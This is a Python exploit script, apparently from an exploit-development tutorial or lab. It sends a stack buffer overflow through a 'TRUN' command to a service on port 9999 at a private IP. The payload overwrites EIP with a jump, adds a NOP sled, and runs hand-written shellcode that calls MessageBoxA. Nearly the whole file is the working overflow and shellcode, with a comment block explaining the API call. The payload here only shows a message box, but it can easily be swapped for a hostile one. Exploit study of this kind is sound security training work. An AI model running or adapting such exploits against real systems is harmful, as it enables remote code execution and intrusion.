#!/usr/bin/python

import socket, sys
from time import sleep

padding = "A" * 2002
EIP = "\xeb\x11\x50\x62"
NOPS = "\x90"*15
offset = "B" * (2200 - (len(padding + EIP + NOPS)))

# arwin.exe User32.dll MeassageBoxA (0x7e4507ea)

MessageBoxA = (
"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCaption
"\x68\x62\x33\x33\x66"              # PUSH "b33f"
"\x8B\xCC"                          # MOV ECX,ESP   => PTR to lpCaption
"\x50"                              # PUSH EAX      => padding for lpText
"\x68\x62\x6F\x78\x21"              # PUSH "box!"
"\x68\x74\x68\x65\x20"              # PUSH "the "
"\x68\x50\x6F\x70\x20"              # PUSH "Pop "
"\x8B\xD4"                          # MOV EDX,ESP   => PTR to lpText
"\x50"                              # PUSH EAX - uType=0x0
"\x51"                              # PUSH ECX - lpCaption
"\x52"                              # PUSH EDX - lpText
"\x50"                              # PUSH EAX - hWnd=0x0
"\xBE\xEA\x07\x45\x7E"              # MOV ESI,USER32.MessageBoxA
"\xFF\xD6")                         # CALL ESI

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	s.connect(('192.168.100.29',9999))
	s.recv(1024)

	print '[*] Send buffer'
	s.send("TRUN /.:/ " + padding + EIP + NOPS + MessageBoxA + offset)
	s.close()
	sleep(1)

except Exception as e:
	print(str(e))
	sys.exit()


#----------------------------------------------------------------------------------#
# (*) MessageBoxA                                                                  #
# (*) arwin.exe => user32.dll - MessageBoxA 0x7E4507EA                             #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# int WINAPI MessageBox(          => PTR to MessageBoxA                            #
#   __in_opt  HWND hWnd,          => 0x0                                           #
#   __in_opt  LPCTSTR lpText,     => Pop the box!                                  #
#   __in_opt  LPCTSTR lpCaption,  => b33f                                          #
#   __in      UINT uType          => 0x0                                           #
# );                                                                               #
#----------------------------------------------------------------------------------#
